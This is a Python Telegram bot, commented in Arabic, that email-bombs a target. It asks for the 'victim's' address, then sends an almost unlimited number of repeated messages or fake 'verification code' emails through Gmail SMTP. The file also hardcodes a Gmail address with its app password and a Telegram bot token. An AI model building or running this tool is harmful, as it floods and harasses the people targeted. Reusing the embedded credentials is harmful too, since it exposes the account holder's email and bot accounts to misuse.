import telebot
import smtplib
import math
import random
import time
from telebot import types  # استيراد أنواع الأزرار
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# ---------------------------------------------------------
# إعدادات البريد الإلكتروني
# ---------------------------------------------------------

# بياناتك الحالية (كما في الملف المرفوع)
fromaddr = "iphone011012013@gmail.com"
password = "qrpf wkub heck bnbi"

# ---------------------------------------------------------
# دوال التشفير والإرسال
# ---------------------------------------------------------

def generateOTP():
    """توليد رمز عشوائي"""
    digits = "0123456789"
    OTP = ""
    for i in range(6):
        OTP += digits[math.floor(random.random() * 10)]
    return OTP

def send_email(mail, subject, content):
    """ارسال الرسالة"""
    toaddr = mail

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = subject 

    body = content
    txt = MIMEText(body, 'plain', 'utf-8')
    msg.attach(txt)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, password.replace(" ", "")) 
        text = msg.as_string()
        server.sendmail(fromaddr, toaddr, text)
        server.quit()
        return True
    except Exception as e:
        print(f"Error sending email: {e}")
        return False

# ---------------------------------------------------------
# إعداد بوت تيليجرام
# ---------------------------------------------------------

API_TOKEN = '7725928700:AAFN07OWx1xPNhvqRwaBskGz-9CvP6YV6W0'
bot = telebot.TeleBot(API_TOKEN)

# تخزين بيانات المستخدمين وحالة الإيقاف
user_data = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # تهيئة البيانات للمستخدم الجديد
    user_data[message.chat.id] = {'stop': False} 
    
    msg = bot.reply_to(message, "أهلاً بك! 🚀\nأرسل بريدك الإلكتروني المستلم (الضحية):")
    bot.register_next_step_handler(msg, process_email_step)

# 🛑 دالة خاصة لمعالجة زر الإيقاف في أي وقت
@bot.message_handler(func=lambda message: message.text == "🛑 إيقاف الإرسال")
def stop_process(message):
    chat_id = message.chat.id
    if chat_id in user_data:
        user_data[chat_id]['stop'] = True # تفعيل وضع الإيقاف
        bot.reply_to(message, "⚠️ تم طلب الإيقاف... سيتم التوقف فوراً.")

def process_email_step(message):
    email = message.text
    if "@" not in email or "." not in email:
        msg = bot.reply_to(message, "بريد خاطئ! حاول مرة أخرى:")
        bot.register_next_step_handler(msg, process_email_step)
        return

    user_data[message.chat.id]['email'] = email
    msg = bot.reply_to(message, "📝 ماذا تريد أن تكتب في الرسالة؟\n\n- اكتب **otp** لكود عشوائي.\n- أو اكتب **أي نص** ليتم تكراره.")
    bot.register_next_step_handler(msg, process_content_step)

def process_content_step(message):
    content = message.text
    user_data[message.chat.id]['content'] = content
    msg = bot.reply_to(message, "🔢 كم عدد الرسائل؟ (أدخل رقماً):")
    bot.register_next_step_handler(msg, process_count_step)

def process_count_step(message):
    chat_id = message.chat.id
    try:
        count = int(message.text)
        if count > 9999999999999999999999999999999999999999999999999999999999999999999: # زيادة الحد قليلاً
            bot.reply_to(message, "⚠️ العدد كبير جداً! الحد الأقصى 9999999999999999999999999999999999999999999999999999999999999999999.")
            return
    except ValueError:
        bot.reply_to(message, "الرجاء إدخال أرقام فقط.")
        return

    email = user_data[chat_id]['email']
    msg_content_template = user_data[chat_id]['content']

    # 1. إنشاء زر الإيقاف
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    stop_btn = types.KeyboardButton("🛑 إيقاف الإرسال")
    markup.add(stop_btn)

    # 2. إعادة ضبط حالة الإيقاف لـ False لبدء عملية جديدة
    user_data[chat_id]['stop'] = False

    bot.send_message(chat_id, f"✅ جاري إرسال {count} رسالة إلى {email}...\nاضغط على الزر بالأسفل للإيقاف.", reply_markup=markup)

    success_count = 0
    
    for i in range(1, count + 1):
        # 3. فحص هل ضغط المستخدم زر الإيقاف؟
        if user_data[chat_id].get('stop', False):
            bot.send_message(chat_id, f"⛔ تم إيقاف العملية يدوياً.\nتم إرسال {success_count} رسالة فقط.", reply_markup=types.ReplyKeyboardRemove())
            return # الخروج من الدالة فوراً

        # تجهيز الرسالة
        if msg_content_template.lower() in ['otp', 'كود']:
            current_message = f"رمز التحقق الخاص بك هو: {generateOTP()}"
            subject = "رمز التحقق (Verification Code)"
        else:
            current_message = msg_content_template
            subject = "رسالة جديدة"

        # محاولة الإرسال
        if send_email(email, subject, current_message):
            bot.send_message(chat_id, f"📤 ({i}/{count}) تم.")
            success_count += 1
        else:
            bot.send_message(chat_id, f"❌ ({i}/{count}) فشل.")
        
        # الانتظار
        time.sleep(2)

    # إزالة الزر عند الانتهاء الطبيعي
    bot.send_message(chat_id, f"🏁 انتهت العملية.\nنجح إرسال {success_count} رسالة.", reply_markup=types.ReplyKeyboardRemove())

print("Bot is running...")
bot.infinity_polling()